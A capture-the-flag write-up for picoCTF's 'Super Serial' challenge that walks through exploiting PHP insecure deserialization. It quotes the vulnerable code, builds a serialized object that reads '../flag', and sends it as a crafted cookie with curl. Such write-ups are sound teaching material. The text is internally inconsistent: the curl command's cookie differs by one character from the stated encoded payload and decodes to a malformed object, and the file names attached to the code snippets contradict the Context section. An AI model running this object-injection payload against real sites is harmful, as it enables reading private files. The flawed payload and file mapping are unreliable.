# Pico CTF Writeup
## Super Serial

#### Context
This exploit works by leveraging a deserialization vulnerability in PHP code. In this context, three main files are involved:
1. `index.php`: Responsible for setting a cookie after the user logs in.
2. `authentication.php`: Responsible for processing and reading the cookie to grant access.
3. `cookie.php`: Contains the `permissions` class that handles login and the `access_log` class that can be used to read log files.

#### Code Analysis

1. **index.php**:
   ```php
   if(isset($_POST["user"]) && isset($_POST["pass"])){
       $con = new SQLite3("../users.db");
       $username = $_POST["user"];
       $password = $_POST["pass"];
       $perm_res = new permissions($username, $password);
       if ($perm_res->is_guest() || $perm_res->is_admin()) {
           setcookie("login", urlencode(base64_encode(serialize($perm_res))), time() + (86400 * 30), "/");
           header("Location: authentication.php");
           die();
       } else {
           $msg = '<h6 class="text-center" style="color:red">Invalid Login.</h6>';
       }
   }
   ```

   - **Serialization**: Users who successfully log in will receive a cookie containing a serialized `permissions` object, encoded in base64 and URL-encoded.

2. **cookie.php**:
   ```php
   if(isset($_COOKIE["login"])){
       try{
           $perm = unserialize(base64_decode(urldecode($_COOKIE["login"])));
           $g = $perm->is_guest();
           $a = $perm->is_admin();
       }
       catch(Error $e){
           die("Deserialization error. ".$perm);
       }
   }
   ```

   - **Deserialization**: The received `login` cookie is deserialized into a `permissions` object.

3. **authentication.php**:
   ```php
   class access_log
   {
       public $log_file;

       function __construct($lf) {
           $this->log_file = $lf;
       }

       function __toString() {
           return $this->read_log();
       }

       function append_to_log($data) {
           file_put_contents($this->log_file, $data, FILE_APPEND);
       }

       function read_log() {
           return file_get_contents($this->log_file);
       }
   }

   if(isset($perm) && $perm->is_admin()){
       $msg = "Welcome admin";
       $log = new access_log("access.log");
       $log->append_to_log("Logged in at ".date("Y-m-d")."\n");
   } else {
       $msg = "Welcome guest";
   }
   ```

   - **read_log()**: This method reads the file specified by the `log_file` property.

#### Exploitation
1. **Manipulating the `access_log` Object**:
   To exploit this vulnerability, we can create an `access_log` object with the `log_file` property set to the file we want to read, in this case, `../flag`.

2. **Serialization and Encoding**:
   We create an `access_log` object with `log_file` set to `../flag`, then serialize it, base64 encode it, and URL encode it.

   ```php
   $exploit_object = new access_log("../flag");
   $serialized_object = serialize($exploit_object);
   $encoded_object = base64_encode($serialized_object);
   $url_encoded_object = urlencode($encoded_object);
   echo $url_encoded_object;
   ```

   Encoded result:
   ```plaintext
   TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo3OiIuLi9mbGFnIjt9
   ```

   Cookie in plaintext:
   ```plaintext
   O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}
   ```

3. **Sending the Cookie**:
   We send the crafted cookie using cURL:

   ```bash
   curl -X POST http://mercury.picoctf.net:3449/authentication.php -b "login=TzoxMDoiYWNjZXNzX2xvZyI6MTp7czo4OiJsb2dfZmlsZSI7czo7OiIuLi9mbGFnIjt9"
   ```

   This cookie contains a serialized `access_log` object with `log_file` set to `../flag`.

4. **Deserialization and File Reading**:
   - When `authentication.php` processes this cookie, it deserializes the `access_log` object and calls the `__toString()` method.
   - The `__toString()` method calls `read_log()`, which reads and returns the contents of the `../flag` file.
   - Since the contents of `../flag` are the flag we are looking for, the flag will be displayed as part of the deserialization error message.

#### Conclusion
The exploit works because we can create an `access_log` object that defines `log_file` as the file we want to read. The deserialization process then restores this object and executes methods that read and return the file contents, giving us access to the flag.